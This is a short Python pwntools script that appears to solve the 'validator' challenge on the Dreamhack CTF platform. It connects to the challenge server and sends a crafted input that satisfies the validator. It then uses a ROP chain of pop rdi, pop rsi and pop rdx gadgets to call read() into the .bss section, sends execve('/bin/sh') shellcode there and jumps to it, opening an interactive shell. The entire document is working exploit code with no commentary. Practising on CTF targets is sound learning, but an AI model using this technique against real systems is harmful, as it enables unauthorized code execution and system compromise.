from pwn import *

port = 16042
rem = remote("host3.dreamhack.games", port)

elf = ELF("./validator/problem/validator_server")
rop = ROP("./validator/problem/validator_server")
context.arch = "amd64"

def slog(name, addr): return success(': '.join([name, hex(addr)]))

payload = b'DREAMHACK!'
for i in range(119, 0, -1):
  payload += chr(i).encode()
payload += b'A' * 7

pop_rdi = rop.find_gadget(['pop rdi'])[0]
pop_rsi = rop.find_gadget(['pop rsi'])[0]
pop_rdx = rop.find_gadget(['pop rdx'])[0]

slog("rdi", pop_rdi)
slog("rsi", pop_rsi)
slog("rdx", pop_rdx)

read_plt = elf.plt['read']
bss_addr = elf.bss()

slog("read plt", read_plt)

shell = asm(shellcraft.execve("/bin/sh", 0, 0))

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss_addr) + p64(0)
payload += p64(pop_rdx) + p64(len(shell) + 1)
payload += p64(read_plt)

payload += p64(bss_addr)

rem.sendline(payload)
rem.sendline(shell)

rem.interactive()